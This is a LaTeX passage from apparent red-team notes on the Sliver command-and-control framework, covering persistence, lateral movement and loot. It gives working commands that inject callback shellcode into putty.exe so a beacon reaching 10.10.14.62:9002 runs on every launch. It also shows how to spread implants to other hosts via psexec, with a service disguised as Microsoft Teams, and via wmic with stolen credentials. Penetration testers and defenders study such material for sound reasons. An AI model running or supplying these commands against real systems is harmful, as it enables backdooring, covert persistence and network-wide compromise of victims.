\section{misc}

\subsection{Persistence}

\subsubsection{Sliver Backdoor}

\verb+backdoor+ command inject a sliver shellcode into an existing file on the target system. A profile that will serve as your base shellcode must be created.
Every time a user starts or attempts to the program, a beacon will be created

for example:
\begin{verbatim}
# create the profile
profiles new --format shellcode --http 10.10.14.62:9002 persistence-shellcode

# start the listener
http -L 10.10.14.62 -l 9002

# backdoor
backdoor --profile persistence-shellcode "C:\Program Files\PuTTY\putty.exe"
\end{verbatim}


An "under-the-hood" overview of the whole process can be found in the source-code of Sliver, specifically in the \href{https://github.com/BishopFox/sliver/blob/b7d0dcc5dd0c469b3792fd791af784278c369ecd/server/rpc/rpc-backdoor.go}{rpc-backdoor.go} (and \href{https://github.com/BishopFox/sliver/blob/b7d0dcc5dd0c469b3792fd791af784278c369ecd/server/rpc/rpc-backdoor.go}{backdoor.go}) file. A high-level explanation of the process: checks if the target is Windows and if not, it will terminate, takes the original binary, validates the existence of the profile for the shellcode and then includes the shellcode into the original binary, and uploads the modified binary to the target, e.g., replacing the original one with a tampered one.

\subsubsection{Other solutions}

see~\ref{windows-persistence}


\subsection{Lateral Movement}

when a host is compromised and we have access to another host as admin:
\begin{enumerate}
    \item set a pivot (tcp) on the current host \verb+pivots tcp --bind <ip> --port <port>+
    \item generate an implant in \verb+service+ format to connect to the pivot \verb+generate --format service -i <ip>:<port> --skip-symbols -N psexec-pivot+
    \item use \verb+psexe+ to install the implant on the target host \verb+psexec --custom-exe ./psexec-pivot.exe --service-name Teams --service-description MicrosoftTeaams <target>+
\end{enumerate}  

alternative solution : 
\begin{enumerate}
    \item generate an implantin \verb+binary+ format to connect to the pivot \verb+generate -i <ip>:<port> --skip-symbols -N wmic-pivot+
    \item upload the implant \verb+upload wmic-pivot.exe+
    \item exec the implant: \verb+execute -o wmic /node:<ip> /user:<user> /password:<password> process call create "C:\\windows\tasks\\wmic-pivot.exe"+
\end{enumerate}   

\subsection{Anti-virus Evasion}



\subsection{Loot}

\href{https://sliver.sh/docs?name=Loot}[Loot]